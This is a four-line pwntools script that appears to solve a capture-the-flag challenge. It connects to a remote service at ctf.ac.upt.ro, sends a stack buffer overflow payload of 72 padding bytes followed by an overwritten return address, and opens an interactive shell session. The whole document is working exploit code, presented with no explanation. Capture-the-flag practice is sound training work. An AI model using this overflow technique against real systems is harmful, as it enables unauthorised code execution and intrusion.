from pwn import *
p = remote("ctf.ac.upt.ro", 9882)
p.sendline(b"A"*72 + p64(0x401196))
p.interactive()
